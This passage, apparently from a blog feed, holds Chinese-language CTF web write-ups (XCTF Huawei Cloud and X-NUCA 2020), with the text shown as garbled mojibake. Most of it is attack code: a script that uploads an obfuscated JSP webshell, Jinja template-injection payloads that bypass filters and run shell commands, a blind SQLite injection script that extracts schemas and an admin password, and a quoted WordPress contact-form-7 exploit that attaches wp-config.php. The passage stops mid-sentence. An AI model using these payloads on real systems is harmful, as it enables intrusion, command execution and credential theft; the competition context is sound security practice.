    <content type="html"><![CDATA[<p>ä¸´è¿‘æœŸæœ«ï¼ŒæŠ½äº†åŠå¤©æ—¶é—´åšäº†å››é“æ°´é¢˜â€¦</p><a id="more"></a><h2 id="webshell-1"><a href="#webshell-1" class="headerlink" title="webshell_1"></a>webshell_1</h2><p>å…æ€çš„jspï¼Œç½‘ä¸Šæ‰¾ä¸ªæ”¹ä¸€æ”¹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">shell = <span class="string">&#x27;&#x27;&#x27;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot;  language=&quot;java&quot; %&gt;</span></span><br><span class="line"><span class="string">&lt;%</span></span><br><span class="line"><span class="string">        Class rt = Class.forName(new String(new byte[] &#123; 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 &#125;));</span></span><br><span class="line"><span class="string">        Process e = (Process) rt.getMethod(new String(new byte[] &#123; 101, 120, 101, 99 &#125;), String.class).invoke(rt.getMethod(new String(new byte[] &#123; 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 &#125;)).invoke(null), &quot;cat /flag&quot; );</span></span><br><span class="line"><span class="string">        \u006a\u0061\u0076\u0061\u002e\u0069\u006f\u002e\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0020\u0069\u006e\u0020\u003d\u0020\u0065\u002e\u0067\u0065\u0074\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u003b</span></span><br><span class="line"><span class="string">        int a = -1;byte[] b = new byte[2048];out.print(&quot;&lt;pre&gt;&quot;);</span></span><br><span class="line"><span class="string">        while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125;out.print(&quot;&lt;/pre&gt;&quot;);</span></span><br><span class="line"><span class="string">%&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line">l = <span class="built_in">len</span>(shell)</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;=&quot;</span> <span class="keyword">in</span> b64encode(shell):</span><br><span class="line">        shell += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        shell += <span class="string">&#x27; &#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">paramsPost = b64encode(shell)</span><br><span class="line">headers = &#123;<span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://121.37.182.111:32201&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">           <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://121.37.182.111:32201/&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">cookies = &#123;<span class="string">&quot;JSESSIONID&quot;</span>: <span class="string">&quot;91329C00210DA235957175E32087F422&quot;</span>&#125;</span><br><span class="line">response = session.post(<span class="string">&quot;http://121.37.182.111:32201/upload.jsp&quot;</span>, data=paramsPost, headers=headers, cookies=cookies,</span><br><span class="line">                        proxies=&#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">path = response.content.strip()</span><br><span class="line"><span class="built_in">print</span> path</span><br><span class="line"><span class="built_in">print</span> requests.get(<span class="string">&#x27;http://121.37.182.111:32201/&#x27;</span> + path).text</span><br></pre></td></tr></table></figure><h2 id="MIE1-1"><a href="#MIE1-1" class="headerlink" title="MIE1_1"></a>MIE1_1</h2><p><a href="https://www.secpulse.com/archives/115367.html">https://www.secpulse.com/archives/115367.html</a></p><p>è¿‡æ»¤äº†argsï¼Œç”¨cookieså°±å¥½äº†ã€‚</p><p><img src="/2020/12/21/2020-XCTF-huawei-cloud/-_Ziw3Hzu0cvoiNtpbRrOWNCEx24iltHK3GWDcPwR5OjDoY_LisT0UOngtZvrN0GxVXe7o55TyjCiGfkJxlA44mSJZ4YTcZ3ixjoBQMK_RKXnYQZNkBB5onM1XCaB0Mse9JTrrrH.png" alt="img"></p><h2 id="MIE2"><a href="#MIE2" class="headerlink" title="MIE2"></a>MIE2</h2><p>è¿‡æ»¤äº†<code>&#123;&#123;</code> ç©ºæ ¼ request set å¼•å· config ç­‰ã€‚</p><p>ä½¿ç”¨ <code>&#123;%</code>ï¼Œ%c æ¥æ‹¼å­—ç¬¦ä¸²ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://121.37.182.111:31969/success&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>(<span class="params">s</span>):</span></span><br><span class="line">    res = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: (<span class="string">&#x27;&quot;%c&quot;%(&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">ord</span>(x)) + <span class="string">&quot;)&quot;</span>), s)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;+&quot;</span>.join(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp = <span class="string">&#x27;&#x27;&#x27;()|attr(&#123;x1&#125;)|attr(&#123;x2&#125;)|attr(&#123;x3&#125;)()|attr(&#123;x4&#125;)(233)|attr(&#123;x5&#125;)|attr(&#123;x6&#125;)|attr(&#123;x4&#125;)(&#123;x7&#125;)|attr(&#123;x4&#125;)(&#123;x8&#125;)(&#123;x9&#125;)&#x27;&#x27;&#x27;</span> \</span><br><span class="line">    .<span class="built_in">format</span>(</span><br><span class="line">    x1=gen(<span class="string">&quot;__class__&quot;</span>), x2=gen(<span class="string">&quot;__base__&quot;</span>), x3=gen(<span class="string">&quot;__subclasses__&quot;</span>), x4=gen(<span class="string">&quot;__getitem__&quot;</span>), x5=gen(<span class="string">&quot;__init__&quot;</span>),</span><br><span class="line">    x6=gen(<span class="string">&quot;__globals__&quot;</span>), x7=gen(<span class="string">&quot;__builtins__&quot;</span>), x8=gen(<span class="string">&quot;eval&quot;</span>),</span><br><span class="line">    x9=gen(<span class="string">&#x27;&#x27;&#x27;__import__(&quot;os&quot;).popen(&#x27;cat flag.txt&#x27;).read()&#x27;&#x27;&#x27;</span>))</span><br><span class="line">msg = <span class="string">&#x27;&#x27;&#x27;&#123;%print\n&#x27;&#x27;&#x27;</span> + exp + <span class="string">&quot;%&#125;&quot;</span></span><br><span class="line">s = requests.get(url, params=&#123;<span class="string">&#x27;msg&#x27;</span>: msg&#125;&#125;)</span><br><span class="line"><span class="built_in">print</span> s.text</span><br></pre></td></tr></table></figure><p><img src="/2020/12/21/2020-XCTF-huawei-cloud/BMv_rlYa235Q-QA3VCfQCYPFsIZRhPA1wDFCEUcITehBsbvK5qZ7efAztPmiGlbMaNqZziqZlcowK3cB_O4c5lzhwEradr9kNvjw-OLIIVC7sUMVT3w9nBr5L9Vz-SIXSzlHzxOQ.png" alt="img"></p><p>ç”¨ <code>\x</code>ç¼–ç çš„å½¢å¼åº”è¯¥ä¹Ÿå¯ä»¥ï¼Œç®€å•ä¸€äº›ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(()|attr(&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x62\x61\x73\x65\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&quot;)()|attr(&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;)(202)|attr(&quot;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;)(&quot;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;)(&quot;\x65\x76\x61\x6c&quot;)(&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x22\x6f\x73\x22\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74\x27\x29\x2e\x72\x65\x61\x64\x28\x29&quot;))%&#125;</span><br></pre></td></tr></table></figure><h2 id="PYER"><a href="#PYER" class="headerlink" title="PYER"></a>PYER</h2><p>username å¤„å­˜åœ¨æ³¨å…¥ï¼ŒSqliteï¼Œæ³¨å‡º admin çš„å¯†ç æ˜¯ <code>sqlite_not_safe</code>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://124.71.207.51:30435/login&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>(<span class="params">username, password</span>):</span></span><br><span class="line">    s = requests.post(url, data=&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;password&#x27;</span>: password&#125;,proxies=&#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> s.status_code==<span class="number">500</span>:</span><br><span class="line">        <span class="built_in">print</span> username</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;login error&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> s.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># table:comment users</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_column</span>():</span></span><br><span class="line">    <span class="comment"># comment users</span></span><br><span class="line">    username = <span class="string">&quot;gml&#x27;union select case when substr((select hex(group_concat(sql)) FROM sqlite_master WHERE type=&#x27;table&#x27; and name=&#x27;users&#x27;),&#123;pos&#125;,1)=&#x27;&#123;value&#125;&#x27; then &#x27;2&#x27; else &#x27;0&#x27; end-- &quot;</span></span><br><span class="line">    data = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>,<span class="number">500</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;0123456789ABCDEF&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> req(username.<span class="built_in">format</span>(pos=i,value=c), <span class="number">2</span>):</span><br><span class="line">                data += c</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(data)%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">                    <span class="built_in">print</span> data.decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pass</span>():</span></span><br><span class="line">    <span class="comment"># sqlite_not_safe</span></span><br><span class="line">    username = <span class="string">&quot;gml&#x27;union select case when substr((select hex(group_concat(password)) FROM users),&#123;pos&#125;,1)=&#x27;&#123;value&#125;&#x27; then &#x27;2&#x27; else &#x27;0&#x27; end-- &quot;</span></span><br><span class="line">    data = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;0123456789ABCDEF&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> req(username.<span class="built_in">format</span>(pos=i,value=c), <span class="number">2</span>):</span><br><span class="line">                data += c</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(data)%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">                    <span class="built_in">print</span> data.decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>():</span></span><br><span class="line">    <span class="comment"># sqlite_not_safe</span></span><br><span class="line">    username = <span class="string">&quot;gml&#x27;union select case when substr((select hex(group_concat(sql)) FROM sqlite_master WHERE type=&#x27;table&#x27; and name=&#x27;comment&#x27;),&#123;pos&#125;,1)=&#x27;&#123;value&#125;&#x27; then &#x27;2&#x27; else &#x27;0&#x27; end-- &quot;</span></span><br><span class="line">    data = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>,<span class="number">500</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;0123456789ABCDEF&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> req(username.<span class="built_in">format</span>(pos=i,value=c), <span class="number">2</span>):</span><br><span class="line">                data += c</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(data)%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">                    <span class="built_in">print</span> data.decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    username = <span class="string">&quot;gml&#x27;union select case when substr((select group_concat(tbl_name) FROM sqlite_master WHERE type=&#x27;table&#x27; and tbl_name NOT like &#x27;sqlite_%&#x27;),1,1)=&#x27;c&#x27; then &#x27;2&#x27; else &#x27;0&#x27; end-- &quot;</span></span><br><span class="line">    <span class="built_in">print</span> req(username, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># test()</span></span><br><span class="line">    <span class="comment"># get_column()</span></span><br><span class="line">    <span class="comment"># get_pass()</span></span><br><span class="line">    get_data()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç™»é™†è¿›adminï¼Œä¸€ä¸ªæŸ¥è¯¢ comment çš„åŠŸèƒ½ï¼Œæœ‰ä¸€å¤„æ³¨å…¥+å›æ˜¾ç‚¹ï¼Œå¯ä»¥sstiã€‚</p><p><img src="https://lh6.googleusercontent.com/rYXDKwGOrEhdBXZuCLvq2bErCvOI77f4rnVv16-hPAZhcHa2J0v0Q6_TW7gytpT4dh1fEBvFqsYqWO5WSyfP8UmQ4TzOTPuZy4U17L2Xp8o3_popz6hfjsf2WmgnuKJGFjAn8RbJ" alt="img"></p><p>ç›´æ¥æŠŠMIE2 é‚£ä¸ªé¢˜çš„payloadå¤ç”¨ä¸€ä¸‹ï¼š</p><p><img src="/2020/12/21/2020-XCTF-huawei-cloud/o-TOac5qa5vCGyWLa7jUZO2a8V6TNsOPk5lVVObwiksAEoavm-tXrgls39OF0u3hB-UUEa8PfrtCNA5NXmZRtST2odZ93QZ5NyYfHz_ihEI8990XbvehtRaQs6fyJsEik7yagWW8.png" alt="img"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä¸´è¿‘æœŸæœ«ï¼ŒæŠ½äº†åŠå¤©æ—¶é—´åšäº†å››é“æ°´é¢˜â€¦&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
    
    <category term="Web" scheme="https://igml.top/categories/CTF/Web/"/>
    
    
    <category term="CTF" scheme="https://igml.top/tags/CTF/"/>
    
    <category term="Web" scheme="https://igml.top/tags/Web/"/>
    
    <category term="huawei-cloud" scheme="https://igml.top/tags/huawei-cloud/"/>
    
  </entry>
  
  <entry>
    <title>2020 X-NUCA å†³èµ› ezwp</title>
    <link href="https://igml.top/2020/12/08/2020-X-NUCA-FINAL/"/>
    <id>https://igml.top/2020/12/08/2020-X-NUCA-FINAL/</id>
    <published>2020-12-08T12:16:13.000Z</published>
    <updated>2020-12-09T07:16:57.474Z</updated>
    
    <content type="html"><![CDATA[<p>å¾€å¹´å¬è¯´ X-NUCA å†³èµ›æœ‰æ¸—é€ï¼Œæƒ³ç€æ¥è¡¥è¡¥æ¸—é€ï¼Œç»“æœä»Šå¹´æ²¡æœ‰äº†â€¦ åªæœ‰ä¸€é“ Webï¼Œç±»ä¼¼è§£é¢˜ï¼Œæäº¤ flag æ¯è½®è‡ªåŠ¨å¾—åˆ†ï¼Œæ²¡æœ‰é˜²å¾¡æ¦‚å¿µã€‚</p><p>é¢˜ç›®åŸºäº Wordpress 5.5.3 æœ€æ–°ç‰ˆæœ¬è¿›è¡Œäº†ä¸€äº›æ”¹åŠ¨ï¼Œå¹¶æ·»åŠ äº†å‡ ä¸ªæ’ä»¶ã€‚æ‹¿åˆ°æºç å…ˆ diff ä¸€ä¸‹ï¼Œå‘ç° wordpress éƒ¨åˆ†æœ‰å‡ å¤„å°çš„æ”¹åŠ¨ï¼Œå…¶ä¸­å¢åŠ äº†å¯¹æ–‡ä»¶ä¸Šä¼ çš„ä¸€ä¸ªè¿‡æ»¤ï¼š</p><a id="more"></a><p><img src="/2020/12/08/2020-X-NUCA-FINAL/image-20201209082627417.png" alt="image-20201209082627417"></p><p>æ–‡ä»¶å†…å®¹ä¸å…è®¸å«æœ‰ phpã€‚å…¶ä»–æœ‰éƒ¨åˆ†æ”¹åŠ¨ï¼Œä½†æ„Ÿè§‰æ²¡ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ã€‚ç»§ç»­çœ‹æ’ä»¶ï¼Œå‘ç°é™¤äº†contact-form-7ï¼Œå‰©ä¸‹çš„æ’ä»¶éƒ½æ˜¯æœ€æ–°ç‰ˆæœ¬ã€‚contact-form-7 æ˜¯ 5.0.3 çš„ç‰ˆæœ¬ã€‚</p><h2 id="é¢„æœŸè§£æ³•"><a href="#é¢„æœŸè§£æ³•" class="headerlink" title="é¢„æœŸè§£æ³•"></a>é¢„æœŸè§£æ³•</h2><p>å¼€å§‹ä¸€ç›´æ²¿ç€é¢„æœŸè§£æ³•åšï¼Œåé¢å¡ä½åšä¸åŠ¨äº†ã€‚</p><p>æœä¸€ä¸‹contact-form-7 5.0.3æ¼æ´ï¼Œå‘ç°æœ‰ä¸€ä¸ªæƒé™æå‡çš„æ¼æ´ï¼š<a href="https://paper.seebug.org/774/">https://paper.seebug.org/774/</a></p><p>diff ä¸€ä¸‹é¢˜ç›®çš„ä»£ç ä¸ contact-form-7 5.0.3æºç ï¼Œå‘ç°å¾ˆæ˜æ˜¾ï¼š</p><p><img src="/2020/12/08/2020-X-NUCA-FINAL/image-20201209082432162.png" alt="image-20201209082432162"></p><p>æƒé™æå‡çš„æ¼æ´æœ€ååˆ©ç”¨å°±æ˜¯é€šè¿‡é‚®ä»¶æ–¹å¼ä»»æ„æ–‡ä»¶è¯»å–ï¼Œè¿™é‡Œå‡ºé¢˜äººé‡å†™äº†å‘é‚®ä»¶å‡½æ•°ï¼Œå¾ˆæ˜æ˜¾å°±æ˜¯è¦åˆ©ç”¨è¿™ä¸ªæ¼æ´ã€‚</p><p>ç”¨æ–‡ç« çš„æ–¹æ³•è¿›è¡Œå¤ç°ï¼Œå‘ç°å¯ä»¥è¶Šæƒåˆ›å»º contactï¼Œä½†æ˜¯æ— æ³•è®¾ç½® email é‚£äº›å…³é”®å‚æ•°ã€‚</p><p>æ–‡ç« çš„expï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> settings = &#123;</span><br><span class="line">    <span class="string">&quot;async&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;crossDomain&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://10.0.0.123/wordpress_v4.9.2/wp-admin/post.php?post=xxx&quot;</span>,</span><br><span class="line">    <span class="string">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;_wpnonce&quot;</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_wp_http_referer&quot;</span>: <span class="string">&quot;%2Fwordpress_v4.9.2%2Fwp-admin%2Fpost-new.php&quot;</span>,</span><br><span class="line">        <span class="string">&quot;user_ID&quot;</span>: <span class="string">&quot;2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;post&quot;</span>,</span><br><span class="line">        <span class="string">&quot;originalaction&quot;</span>: <span class="string">&quot;editpost&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_author&quot;</span>: <span class="string">&quot;2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_type&quot;</span>: <span class="string">&quot;wpcf7_contact_form&quot;</span>,</span><br><span class="line">        <span class="string">&quot;original_post_status&quot;</span>: <span class="string">&quot;auto-draft&quot;</span>,</span><br><span class="line">        <span class="string">&quot;auto_draft&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_title&quot;</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">        <span class="string">&quot;content&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">        <span class="string">&quot;wp-preview&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;hidden_post_status&quot;</span>: <span class="string">&quot;draft&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_status&quot;</span>: <span class="string">&quot;draft&quot;</span>,</span><br><span class="line">        <span class="string">&quot;hidden_post_password&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;hidden_post_visibility&quot;</span>: <span class="string">&quot;public&quot;</span>,</span><br><span class="line">        <span class="string">&quot;visibility&quot;</span>: <span class="string">&quot;public&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_password&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;mm&quot;</span>: <span class="string">&quot;12&quot;</span>,</span><br><span class="line">        <span class="string">&quot;jj&quot;</span>: <span class="string">&quot;22&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_thumbnail_id&quot;</span>: <span class="string">&quot;-1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;advanced_view&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;comment_status&quot;</span>: <span class="string">&quot;open&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ping_status&quot;</span>: <span class="string">&quot;open&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_name&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;meta_input[_mail][subject]&quot;</span>: <span class="string">&quot;test \&quot;[your-subject]\&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;meta_input[_mail][sender]&quot;</span>: <span class="string">&quot;2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;meta_input[_mail][recipient]&quot;</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">        <span class="string">&quot;meta_input[_mail][body]&quot;</span>: <span class="string">&quot;From: [your-name] &lt;[your-email]&gt;\\nSubject: [your-subject]\\n\\nMessage Body:\\n[your-message]\\n\\n-- \\n&quot;</span>,</span><br><span class="line">        <span class="string">&quot;meta_input[_mail][additional_headers]&quot;</span>: <span class="string">&quot;Reply-To: [your-email]&quot;</span>,</span><br><span class="line">        <span class="string">&quot;meta_input[_mail][attachments]&quot;</span>: <span class="string">&quot;../wp-config.php&quot;</span>,</span><br><span class="line">        <span class="string">&quot;meta_input[_mail][use_html]&quot;</span>: <span class="string">&quot;false&quot;</span>,</span><br><span class="line">        <span class="string">&quot;meta_input[_mail][exclude_blank]&quot;</span>: <span class="string">&quot;false&quot;</span>,</span><br><span class="line">        <span class="string">&quot;meta_input[_form]&quot;</span>: <span class="string">&quot;&lt;label&gt; Your Name (required)\n    [text* your-name] &lt;/label&gt;\n\n&lt;label&gt; Your Email (required)\n    [email* your-email] &lt;/label&gt;\n\n&lt;label&gt; Subject\n    [text your-subject] &lt;/label&gt;\n\n&lt;label&gt; Your Message\n    [textarea your-message] &lt;/label&gt;\n\n[submit \\\&quot;Send\\\&quot;]&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">jQuery.ajax(settings).done(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(response);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>expä¸­é€šè¿‡ <code>meta_input</code>å‚æ•°è®¾ç½®äº† email çš„ä¸€äº›å…³é”®å±æ€§ã€‚ä½†æ˜¯åœ¨æœ¬åœ°å¤ç°è¿‡ç¨‹ä¸­åªèƒ½åˆ›å»º contactï¼Œè¿™äº›å…³é”® meta 